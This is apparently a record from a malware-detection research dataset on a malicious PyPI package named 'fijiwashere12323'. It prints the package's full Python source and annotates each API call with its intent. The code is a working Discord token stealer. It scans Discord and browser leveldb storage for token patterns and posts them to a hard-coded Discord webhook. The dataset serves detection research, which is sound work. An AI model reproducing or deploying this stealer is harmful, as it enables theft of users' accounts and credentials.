{
  "metadata": {
    "package_name": "fijiwashere12323-0",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/tool_detect/false_negative/llm_analysis/fijiwashere12323-0.0.0.json",
    "dataset_type": "malware_fn"
  },
  "code_files": [
    {
      "pyfile": "__init__.py",
      "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/fijiwashere12323-0.0.0/fijiwashere12323-0.0.0/fijitestinglol12333/__init__.py",
      "code_snippets": [
        {
          "snippet": "import os,re,json\nfrom urllib.request import Request as F,urlopen as G\nH='https://discord.com/api/webhooks/1040303532609376347/ZLcvVwZdh1dNz6A0HxIgzmJW7HgPz6RAlPishp4HBIsasFai0j3Km8bkS2BhemsEnLtF'\ndef I(path):\n\tA=path;A+='\\Local Storage\\leveldb';C=[]\n\tfor B in os.listdir(A):\n\t\tif not B.endswith('.log')and not B.endswith('.ldb'):continue\n\t\tfor D in [C.strip()for C in open(f'{A}\\{B}',errors='ignore').readlines()if C.strip()]:\n\t\t\tfor E in ('[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}','mfa\\.[\\w-]{84}'):\n\t\t\t\tfor F in re.findall(E,D):C.append(F)\n\treturn C\ndef A():\n\tP='url';C=os.getenv('LOCALAPPDATA');B=os.getenv('APPDATA');J={'Discord':B+'\\Discord','Discord Canary':B+'\\discordcanary','Discord PTB':B+'\\discordptb','Google Chrome':C+'\\Google\\Chrome\\User Data\\Default','Opera':B+'\\Opera Software\\Opera Stable','Brave':C+'\\BraveSoftware\\Brave-Browser\\User Data\\Default','Yandex':C+'\\Yandex\\YandexBrowser\\User Data\\Default'};A=''\n\tfor (K,D) in J.items():\n\t\tif not os.path.exists(D):continue\n\t\tA+=f'\n**{K}**\n```\n';E=I(D)\n\t\tif len(E)>0:\n\t\t\tfor L in E:A+=f'{L}\n'\n\t\telse:A+='No tokens found.\\n'\n\t\tA+='```'\n\tM={'Content-Type':'application/json','User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'};N=json.dumps({'content':'','embeds':[{'title':'fiji stub','description':f'{A}','color':15329769,'thumbnail':{P:'https://play-lh.googleusercontent.com/jkpabs01pnEU5Jc9U3MuWdwwoWi8v7x33RZNYyLP2T8a2j1csnjOy3_-KI6JU8JntlNW'},'image':{P:'https://hips.hearstapps.com/hmg-prod/images/funny-cat-captions-1563551842.jpg'}}],'attachments':[]})\n\ttry:O=F(H,data=N.encode(),headers=M);G(O)\n\texcept:pass\nif __name__=='__main__':A()",
          "triple_sequences": [
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "LOCALAPPDATA",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "APPDATA",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "D (various Discord/Browser data directories)",
              "object_description": "Browser data directory",
              "object_id": "browser_data_directory",
              "intention_description": "Determine directory presence",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "A (browser/discord data directory + '\\Local Storage\\leveldb')",
              "object_description": "Browser data directory",
              "object_id": "browser_data_directory",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "f'{A}\\{B}'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "file.readlines()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "str.strip()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Prepare string for further processing",
              "intention_id": "prepare_string_processing"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "E, D (regex pattern, file line)",
              "object_description": "Regular expression and file content",
              "object_id": "regex_file_content",
              "intention_description": "Extract browser tokens",
              "intention_id": "extract_browser_tokens"
            },
            {
              "action_api": "json.dumps()",
              "action_description": "Serializes Python object to JSON string",
              "action_id": "serialize_to_json",
              "object": "{'content':'','embeds':[...],'attachments':[]}",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Serialize data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "str.encode()",
              "action_description": "Encodes string to bytes using default encoding",
              "action_id": "encode_string_to_bytes",
              "object": "N (JSON string)",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Encode string to bytes",
              "intention_id": "encode_string_to_bytes"
            },
            {
              "action_api": "urllib.request.Request()",
              "action_description": "Creates HTTP request object with specified URL, data, and headers",
              "action_id": "create_http_request",
              "object": "H (webhook URL), data=N.encode(), headers=M",
              "object_description": "Discord webhook URL",
              "object_id": "discord_webhook_url",
              "intention_description": "Prepare URL for HTTP request",
              "intention_id": "prepare_url_http_request"
            },
            {
              "action_api": "urllib.request.urlopen()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "O (Request object)",
              "object_description": "Request object for external domain",
              "object_id": "request_external_domain",
              "intention_description": "Send Discord tokens to server",
              "intention_id": "send_discord_tokens_server"
            }
          ]
        }
      ]
    }
  ]
}